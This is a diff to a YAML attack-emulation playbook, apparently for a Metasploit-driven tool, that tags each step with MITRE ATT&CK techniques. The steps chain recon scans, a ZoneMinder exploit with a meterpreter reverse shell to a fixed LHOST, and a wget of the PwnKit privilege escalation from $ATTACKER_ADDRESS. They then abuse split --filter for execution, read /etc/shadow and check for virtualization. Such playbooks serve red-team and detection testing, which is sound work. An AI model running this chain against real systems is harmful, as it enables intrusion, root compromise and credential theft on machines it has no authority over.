@@ -18,15 +18,27 @@ commands:
 
   - type: shell
     cmd: dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN
+    metadata:
+      techniques: "T1590,T1591"
+      tactics: "Reconnaissance"
 
   - type: shell
     cmd: sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS
+    metadata:
+      techniques: "T1595,T1592"
+      tactics: "Reconnaissance"
 
   - type: shell
     cmd: "nikto -host $SERVER_ADDRESS"
+    metadata:
+      techniques: "T1595"
+      tactics: "Reconnaissance"
 
   - type: shell
     cmd: "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    metadata:
+      techniques: "T1594"
+      tactics: "Reconnaissance"
 
   - type: msf-module
     cmd: exploit/unix/webapp/zoneminder_snapshots
@@ -36,7 +48,9 @@ commands:
     payload_options:
       LHOST: 192.42.1.174
     payload: cmd/unix/python/meterpreter/reverse_tcp
-
+    metadata:
+      techniques: "T1190,T1059"
+      tactics: "Initial Access"
 
   - type: msf-session
     stdapi: True
@@ -46,7 +60,9 @@ commands:
   - type: msf-session
     session: "foothold"
     cmd: upload /var/www/html/linpeas.sh
-
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
 
   - type: msf-session
     cmd: shell
@@ -55,6 +71,9 @@ commands:
   - type: msf-session
     cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
     session: "foothold"
+    metadata:
+      techniques: "T1574,T1104"
+      tactics: "Persistence,Privilege Escalation,Defense Evasion"
  
   - type: msf-session
     cmd: export SHELL=bash
@@ -81,6 +100,9 @@ commands:
     write: True
     session: "foothold"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1087,T1083,T1201,T1069,T1057,T1518,T1082,T1614,T1016,T1049,T1033,T1007,T1615"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1
@@ -90,6 +112,9 @@ commands:
   - type: msf-session
     cmd: chmod +x PwnKit && ./PwnKit
     session: "foothold"
+    metadata:
+      techniques: "T1068, T1546, T1574"
+      tactics: "Privilege Escalation"
 
   - type: msf-session
     cmd: id
@@ -105,6 +130,9 @@ commands:
     cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
     session: "foothold"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1218,T1098"
+      tactics: "Defense Evasion,Persistence,Privilege Escalation"
 
 #  - type: msf-session
 #    cmd: rm /opt/README.txt
@@ -149,22 +177,37 @@ commands:
   - type: ssh
     cmd: cat /etc/shadow
     session: "rootshell"
+    metadata:
+      techniques: "T1555"
+      tactics: "Credential Access"
 
   - type: ssh
     cmd: lspci
     session: "rootshell"
+    metadata:
+      techniques: "T1120"
+      tactics: "Discovery"
 
   - type: ssh
     cmd: command -v lsusb
     session: "rootshell"
+    metadata:
+      techniques: "T1120"
+      tactics: "Discovery"
 
   - type: ssh
     cmd: date
     session: "rootshell"
+    metadata:
+      techniques: "T1124"
+      tactics: " Discovery"
 
   - type: ssh
     cmd: find /usr -name \*virtualbox\*
     session: "rootshell"
+    metadata:
+      techniques: "T1497"
+      tactics: "Defense Evasion, Discovery"
 
 
       #
